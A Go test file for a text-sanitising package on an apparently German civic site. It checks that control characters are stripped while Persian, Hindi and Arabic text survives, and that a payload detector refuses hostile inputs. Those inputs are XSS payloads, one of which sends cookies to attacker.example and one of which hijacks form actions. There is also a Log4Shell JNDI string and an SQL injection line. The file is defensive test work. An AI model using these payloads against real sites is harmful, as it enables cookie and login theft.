package content

import "testing"

// TestSanitiseRemovesOnlyWhatNobodyWrote: the one change made to an editor's
// text has to be provably invisible — control codes out, every readable
// character untouched.
func TestSanitiseRemovesOnlyWhatNobodyWrote(t *testing.T) {
	// Stored one way, displayed another, and html/template does not touch it
	// because it is not markup.
	reordering := "Der Rat streicht ‮ 100 Millionen ‬ aus dem Haushalt."
	clean, removed := Sanitise(reordering)
	if !removed {
		t.Error("the bidi overrides were not removed")
	}
	if clean != "Der Rat streicht  100 Millionen  aus dem Haushalt." {
		t.Errorf("clean = %q", clean)
	}

	// What a PDF leaves in every word somebody pastes out of it.
	if clean, removed := Sanitise("Haus\u00adhalts\u00adsiche\u00adrungs\u00adkonzept"); !removed || clean != "Haushaltssicherungskonzept" {
		t.Errorf("soft hyphens survived: %q", clean)
	}

	// Writing must survive exactly. ZWNJ and ZWJ are letter-forming in
	// Persian, Urdu and the Indic languages; the directional *marks* are
	// ordinary in mixed Arabic and Hebrew and are too weak to reorder
	// anything.
	untouched := []string{
		"Das Schwimmbad schließt.\nDas nächste ist 20 km entfernt.",
		"Größe, Straße, Kürzung, 100 Mio.\t€",
		"نمی‌خواهم",                // Persian, with a ZWNJ inside the word
		"‏مظاهرة‎ vor dem Rathaus", // RLM and LRM around mixed text
		"क्‍या",                    // Hindi with a ZWJ
	}
	for _, text := range untouched {
		if clean, removed := Sanitise(text); removed || clean != text {
			t.Errorf("Sanitise(%q) = %q, removed=%v — writing was altered", text, clean, removed)
		}
	}
}

// TestContainsExecutablePayload covers the refusal that does not care how
// genuine the rest of the text reads.
func TestContainsExecutablePayload(t *testing.T) {
	refused := []string{
		`<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>`,
		`"><img src=x onerror=alert(1)>`,
		`<img src=x onerror="alert(1)">`,
		`<video><source onerror=alert(1)>`,
		`<details open ontoggle=alert(1)>`,
		`<svg/onload=alert(document.domain)>`,
		`<iframe src="data:text/html;base64,PHNjcmlwdD4=">`,
		`" onmouseover="fetch('//attacker.example/')" x="`,
		`[Hier klicken](javascript:document.location='https://attacker.example')`,
		`<style>body{display:none}</style>`,
		`{{ .Secret }} {{ template "layout" . }}`,
		`${jndi:ldap://attacker.example/a}`,
		// The one that matters most: a real announcement with a payload inside.
		"Demo am Samstag um 14 Uhr vor dem Rathaus.\n" +
			"<script>document.querySelectorAll('form').forEach(f=>f.action='https://attacker.example')</script>\n" +
			"Bringt Transparente mit.",
	}
	for _, text := range refused {
		if !ContainsExecutablePayload(text) {
			t.Errorf("not refused: %q", text)
		}
	}

	// The handler pattern must not start eating ordinary German and English.
	allowed := []string{
		"Das Schwimmbad schließt und das nächste ist 20 km entfernt.",
		"Die Kürzung = 100 Millionen Euro, verteilt auf drei Jahre.",
		"Konzept, Kontrolle und Konsequenzen: on = an, off = aus.",
		"Die Miete ist von 450 auf 620 Euro gestiegen, also +38 %.",
		"Wartezeit < 3 Monate wurde versprochen, es sind zwei Jahre.",
		"Das Formular auf der Seite der Stadt funktioniert nicht, der Stil ist unlesbar.",
		"Quelle: Ratsinformationssystem, Vorlage 2026/0412, Seite 14.",
		"Montagsdemo: once a week, on Monday = every week.",
		"'; DROP TABLE topics; -- und außerdem schließt die Bibliothek",
	}
	for _, text := range allowed {
		if ContainsExecutablePayload(text) {
			t.Errorf("false positive, an ordinary text would be refused: %q", text)
		}
	}
}
